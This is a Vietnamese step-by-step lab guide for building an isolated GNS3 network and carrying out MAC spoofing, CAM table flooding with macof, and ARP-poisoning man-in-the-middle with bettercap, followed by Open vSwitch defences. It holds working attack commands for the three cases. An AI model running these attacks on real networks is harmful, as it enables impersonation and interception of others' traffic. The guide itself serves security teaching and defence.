# Hướng dẫn làm lab MAC Spoofing (thực hành từng bước)

[English](lab-build-walkthrough.md) · **Tiếng Việt**

> Tài liệu này ghi lại **quy trình thực tế** để dựng và chạy lab trên **Windows + VMware + GNS3**,
> kèm cách xử lý các lỗi hay gặp. Dùng kèm với [`index.html`](../index.html) (guide tương tác)
> và [`huong-dan-viet-bao-cao.md`](huong-dan-viet-bao-cao.md) (viết báo cáo).

## ⚠️ Phạm vi & đạo đức

Chỉ chạy trong **mạng ảo cô lập** (GNS3, **không nối Internet / mạng trường / mạng thật**).
Tấn công mạng không được phép là **vi phạm pháp luật**.

---

## 0. App cần tải (chỉ 3 thứ)

| App | Dùng để |
|---|---|
| **VMware Workstation / Player** | Chạy máy ảo |
| **GNS3** + **GNS3 VM** (bản VMware) | Nền mô phỏng mạng |
| **Kali Linux** (VM) | Máy tấn công (có sẵn macchanger, macof, bettercap, Wireshark) |

**Không cần tải thêm:**
- **Open vSwitch** → cài trong GNS3 (appliance).
- **Victim + Gateway** → dùng **VPCS** (built-in GNS3, cực nhẹ).
- **Wireshark / Npcap** → đã có sẵn trong Kali / cài kèm GNS3.

> **RAM:** dùng VPCS cho victim/gateway thì chỉ **Kali + GNS3 VM** là nặng → máy 16GB chạy thoải mái.

---

## 1. Sơ đồ & bảng địa chỉ

Mạng phẳng `192.168.10.0/24`, tất cả cắm chung một switch Open vSwitch (`br0`).

| Node (tên GNS3) | Vai trò | IP | MAC | Cổng OVS |
|---|---|---|---|---|
| **Hacker** (Kali qua Cloud/VMnet2) | attacker | `192.168.10.50` | `aa:bb:cc:00:00:50` (pin tay) | eth0 |
| **PC1** (VPCS) | victim | `192.168.10.10` | `00:50:79:66:68:00` *(VPCS tự gán)* | eth1 |
| **PC2** (VPCS) | gateway | `192.168.10.1` | `00:50:79:66:68:01` *(VPCS tự gán)* | eth2 |

> **MAC của VPCS cố định theo node** (không random), giữ nguyên qua mỗi lần tắt/bật.
> Lấy giá trị thật bằng `show ip`. Rule phòng thủ phải dùng **đúng MAC VPCS này**, không dùng
> `aa:bb:cc:00:00:10` như script mẫu (VPCS không đặt được MAC tùy ý).

---

## 2. Chuẩn bị Windows — tắt Hyper-V (bắt buộc)

GNS3 VM cần **VT-x nested**. Trên Windows 11, Hyper-V thường chiếm VT-x làm VMware báo lỗi
*"Virtualized Intel VT-x/EPT is not supported"*. Phải tắt Hyper-V.

Mở **PowerShell (Admin)**:

```powershell
Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName HypervisorPlatform -NoRestart
bcdedit /set hypervisorlaunchtype off
```

Rồi: **Windows Security → Device security → Core isolation → tắt Memory integrity**.

**TẮT NGUỒN HẲN** (Shut down, không phải Restart) rồi bật lại. Kiểm tra:

```powershell
systeminfo | Select-String "Hyper-V Requirements" -Context 0,4
```

→ Thấy đủ 4 dòng *VM Monitor Mode / Virtualization Enabled / SLAT / DEP* = hypervisor đã tắt, OK.

> **Bật lại sau khi xong lab:** `bcdedit /set hypervisorlaunchtype auto` + bật lại các feature +
> Memory integrity, rồi reboot.

---

## 3. Dựng GNS3 + GNS3 VM

1. Cài GNS3, chọn kèm **GNS3 VM bản VMware**.
2. GNS3 → `Edit → Preferences → GNS3 VM` → engine **VMware**, tick **Enable**, chọn đúng VM **"GNS3 VM"**
   (KHÔNG phải VM Kali).
3. Chờ **Servers Summary** hiện **GNS3 VM** chấm **xanh lá**.
4. `File → New template → Install an appliance from the GNS3 server` → **Open vSwitch** → Install
   (chạy trên GNS3 VM).
5. `File → New blank project` → tên `MAC-Spoofing-Lab` → kéo node **Open vSwitch** ra canvas.

---

## 4. Thêm victim + gateway (VPCS)

1. Thanh trái → **Browse end devices** → kéo **VPCS** ra 2 lần (`PC1`, `PC2`).
2. Nối dây (**Add a link**): PC1 → OVS **eth1**, PC2 → OVS **eth2**.
3. Start → double-click cấu hình:

**PC1 (victim):**
```
ip 192.168.10.10 192.168.10.1 /24
save
show ip
```

**PC2 (gateway):**
```
ip 192.168.10.1 /24
save
show ip
```

Ghi lại **MAC** từ `show ip` của cả hai.

---

## 5. Thêm Kali bằng node Cloud (cách ổn định nhất)

> Thêm Kali làm "VMware VM node" trực tiếp trên Windows hay kẹt lỗi
> *"bridge already exist"* / *"No VMnet interface available"*. Dùng **node Cloud + VMnet2** né được.

### 5.1 Tạo VMnet2 (host-only)
VMware → `Edit → Virtual Network Editor` → **Change Settings** (Admin) → **Add Network → VMnet2**:
- Loại **Host-only**, giữ tick *"Connect a host virtual adapter"*, **bỏ** DHCP.
- Apply → OK.

### 5.2 Gán card Kali
VMware → Kali **Power Off** → `Settings → Network Adapter` → **Custom: VMnet2** → OK.

### 5.3 Thêm node Cloud trong GNS3
1. Kéo node **Cloud** ra canvas (đổi tên "Hacker" cho dễ nhìn).
2. Double-click → tab **Ethernet interfaces** → chọn **"VMware Network Adapter VMnet2"** → Add → OK.
3. Nối **Cloud → OVS eth0**.
4. Start. Mở Kali **trong VMware** (node Cloud không quản lý nguồn Kali) rồi cấu hình:

```bash
sudo ip link set eth0 down
sudo ip link set eth0 address aa:bb:cc:00:00:50
sudo ip link set eth0 up
sudo ip addr add 192.168.10.50/24 dev eth0
```

---

## 6. Kiểm tra thông mạng (mốc báo cáo 3.1)

Từ Kali:
```bash
ping -c 3 192.168.10.10    # victim
ping -c 3 192.168.10.1     # gateway
```
Cả hai **0% packet loss** → setup xong. **Chụp màn hình.**

---

## 7. Case 1 — MAC Spoofing

**Ý tưởng:** Kali giả MAC victim → switch nhầm danh tính → traffic victim có thể về Kali.

### Before (chụp baseline)
```bash
macchanger -s eth0                 # Kali: MAC thật aa:bb:cc:00:00:50   → Ảnh 1
ping -c 2 192.168.10.10 ; ping -c 2 192.168.10.1
```
Console OVS:
```bash
ovs-appctl fdb/show br0            # mỗi MAC một port riêng              → Ảnh 2
```

### Attack
```bash
sudo wireshark &                   # bắt trên eth0, lọc arp || icmp
sudo ip link set eth0 down
sudo macchanger -m 00:50:79:66:68:00 eth0     # MAC của victim
sudo ip link set eth0 up
macchanger -s eth0                 # Current MAC = MAC victim            → Ảnh 3
ping -c 3 192.168.10.1
```

### After (bằng chứng)
Console OVS:
```bash
ovs-appctl fdb/show br0            # MAC victim nay o PORT 1 (Kali)      → Ảnh 4
```

### Khôi phục
```bash
sudo ip link set eth0 down
sudo macchanger -p eth0
sudo ip link set eth0 up
sudo ip addr add 192.168.10.50/24 dev eth0
```

**Kết luận:** thành công — switch không ràng buộc MAC↔port nên bị mạo danh.

---

## 8. Case 2 — CAM Overflow (concept)

```bash
# victim: ping gateway liên tục; Kali bắt Wireshark lọc icmp
sudo macof -i eth0        # Ctrl+C sau ~20s
```

> **Lưu ý:** OVS có CAM table lớn, thường **không** vào "hub mode" như Cisco thật → có thể không
> bắt được traffic victim↔gateway. Nếu vậy, trình bày Case 2 ở mức **minh họa khái niệm**, dồn số
> liệu chính vào Case 1 & 3.

---

## 9. Case 3 — ARP + MAC Spoofing (MITM)

**Ý tưởng:** Kali đầu độc ARP để đứng giữa victim ↔ gateway.

### Before
Trên PC1:
```
show arp                  # 192.168.10.1 ↔ 00:50:79:66:68:01 (gateway that)  → Ảnh
```

### Attack
Trên Kali:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0
```
Trong bettercap:
```
set arp.spoof.targets 192.168.10.10
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
```
Trên PC1: `ping 192.168.10.1` (tạo traffic).

### After (bằng chứng)
- PC1 `show arp` → MAC của `192.168.10.1` bị đổi thành **MAC Kali `aa:bb:cc:00:00:50`** → chụp.
- Kali/Wireshark in traffic victim ↔ gateway → chụp.

### Dừng
```
arp.spoof off
quit
```

---

## 10. Phòng thủ trên Open vSwitch

Mở console node **OpenvSwitch-2**. Lấy số port thật:
```bash
ovs-ofctl show br0
```

Bind **MAC↔port** (chặn Case 1 & 2) và **IP↔MAC cho ARP** (chặn Case 3). Xem
[`scripts/ovs-defense.sh`](../scripts/ovs-defense.sh) — **nhớ thay MAC** bằng MAC VPCS thật
(`00:50:79:66:68:00`, `:01`) và số port đúng.

Sau khi bật rule, **chạy lại từng case** để xác nhận bị chặn:
```bash
ovs-ofctl dump-flows br0      # xem drop counter tăng
```
Gỡ rule về trạng thái không phòng thủ: [`scripts/ovs-reset.sh`](../scripts/ovs-reset.sh).

---

## 11. Tiêu chí đo & chụp bằng chứng

| Tiêu chí | Lệnh / cách đo |
|---|---|
| Tấn công thành công? | Wireshark bắt được traffic victim / fdb/show / show arp |
| Frame bị chặn | `ovs-ofctl dump-flows br0` (drop counter) |
| Thời gian chặn | timestamp từ lúc tấn công đến drop đầu tiên |
| Ảnh hưởng traffic hợp lệ | victim↔gateway còn ping được không (false positive) |
| MAC giả trong CAM | `ovs-appctl fdb/show br0` trước/sau |

Điền kết quả vào worksheet trong [`index.html`](../index.html) (mục cuối, tự lưu local).

---

## 12. Lỗi thường gặp (tổng hợp)

| Lỗi | Nguyên nhân | Cách sửa |
|---|---|---|
| "VT-x/EPT not supported" | Hyper-V chiếm VT-x | Tắt Hyper-V (mục 2) |
| GNS3 VM không xanh | Chưa cấu hình / trỏ nhầm VM Kali | Preferences → GNS3 VM chọn đúng "GNS3 VM" |
| "Attachment 'nat' already configured" | Card VMware để NAT | Dùng node Cloud + VMnet2 (mục 5) |
| "bridge ethernet0.vnet already exist" | Bật Kali cả 2 nơi | Dùng node Cloud, không thêm Kali làm VMware VM node |
| "No VMnet interface available" | Chưa tạo vmnet2–19 | Tạo VMnet2 trong Virtual Network Editor |
| Solar-PuTTY xin email | Màn hình quảng cáo | Bỏ qua, không nhập email |

---

<sub>🤖 Tài liệu thực hành cho lab MAC Spoofing — dùng kèm index.html và hướng dẫn viết báo cáo.</sub>
